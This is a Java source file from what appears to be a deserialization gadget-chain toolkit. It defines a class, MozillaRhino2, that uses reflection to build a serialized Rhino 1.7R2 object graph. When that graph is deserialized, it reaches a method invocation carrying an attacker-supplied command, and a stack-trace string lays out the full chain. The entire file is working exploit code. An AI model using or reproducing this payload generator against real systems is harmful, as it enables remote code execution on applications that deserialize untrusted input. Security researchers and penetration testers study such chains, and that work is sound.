package org.ses.gadgetbuilder.chains1;

import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"rhino:js:1.7R2"})
@Authors({ Authors.TINT0 })
@Impact(Impact.MethodInvoke)
public class MozillaRhino2 extends MethodInvokeGadgetChain<NoTrampoline, GetterMethodInvokeAdapter> {
    public MozillaRhino2(NoTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>)Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[] {Method.class},
                new Object[] {Context.class.getMethod("enter")});

        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        makeSlot.setAccessible(true);
        Object slot = makeSlot.invoke(initContextScriptableObject, "foo", 0, 4);
        Reflections.setFieldValue(slot, "getter", initContextMemberBox);

        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, this.methodInvokeAdapter.getGetterMethodProperty(), 0, 2);

        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaArray, "javaObject", this.methodInvokeAdapter.getInvocationTarget(command));
        nativeJavaArray.setPrototype(scriptableObject);
        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        return new TrampolineConnector(nativeJavaObject);
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }


        @Override
        protected String getStackTrace() {
            return "org.mozilla.javascript.NativeJavaObject.readObject()\n"+
                    "java.lang.Method.invoke() -> statically defined reflective call target: org.mozilla.javascript.JavaAdapter.readAdapterObject\n"+
                    "org.mozilla.javascript.JavaAdapter.readAdapterObject()\n"+
                    "org.mozilla.javascript.JavaAdapter.getAdapterClass()\n"+
                    "org.mozilla.javascript.JavaAdapter.getObjectFunctionNames()\n"+
                    "org.mozilla.javascript.ScriptableObject.getProperty()\n"+
                    "org.mozilla.javascript.IdScriptableObject.get()\n"+
                    "org.mozilla.javascript.ScriptableObject.get()\n"+
                    "org.mozilla.javascript.ScriptableObject.getImpl()\n"+
                    "org.mozilla.javascript.NativeJavaMethod.call()\n"+
                    "org.mozilla.javascript.MemberBox.invoke()\n"+
                    "java.lang.reflect.Method.invoke()";
        }

}
